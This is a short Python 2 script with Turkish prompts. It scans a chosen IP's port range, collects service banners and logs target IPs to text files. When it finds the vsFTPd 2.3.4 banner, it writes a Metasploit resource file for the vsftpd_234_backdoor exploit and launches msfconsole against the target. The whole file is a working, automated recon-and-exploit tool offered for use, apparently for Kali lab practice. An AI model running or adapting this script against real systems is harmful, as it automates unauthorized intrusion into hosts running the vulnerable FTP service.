# -*- coding: utf-8 -*-
import socket
import subprocess
banner_liste=[]
IP=raw_input("Ip adresini giriniz:")
baslangic_port=input("Baslangic port:")
bitis_port=input("Bitis port:")
for port in range(baslangic_port,bitis_port):
	try:
		soket = socket.socket()
		soket.connect((IP,port))
		banner=str(soket.recv(1024))
		print "[+]Port:",str(port)
		print "[+]Banner:",banner
		banner_liste.append(str(banner))
		if port == 22:
			print "Bu sistem linux veya bir ağ cihazı olabilir"
			dosya= open("linux.txt","r")
			icerik = dosya.read()
			dosya.close()
			if not str(IP) in icerik:
				dosya = open("linux.txt","a")
				veri= IP+"\n"
				dosya.write(veri)
				dosya.close()
		print "Yeni IP adresi kontrolü"
		dosya = open("yeni_ip.txt","r")
		icerik = dosya.read()
		dosya.close()
		if not str(IP) in icerik:
			dosya = open("yeni_ip.txt","a")
			veri = IP+"\n"
			dosya.write(veri)
			dosya.close()
		soket.close()
	except:
		pass
for servis in banner_liste:
	if "vsFTPd 2.3.4" in servis:
		print "FTP servisi exploit edilebilir"
		try:
			rc_kod = """use exploit/unix/ftp/vsftpd_234_backdoor
			set RHOSTS IP_adresi
			set RPORT 21
			exploit"""
			rc_son = rc_kod.replace("IP_adresi",str(IP))
			dosya = open("/home/kali/Desktop/vsftpd.rc","w")
			dosya.write(rc_son)
			dosya.close()
			kod = "xterm  -e msfconsole -r /home/kali/Desktop/vsftpd.rc"
			subprocess.Popen(kod,shell=True,stdout=subprocess.PIPE)
		except:
			pass
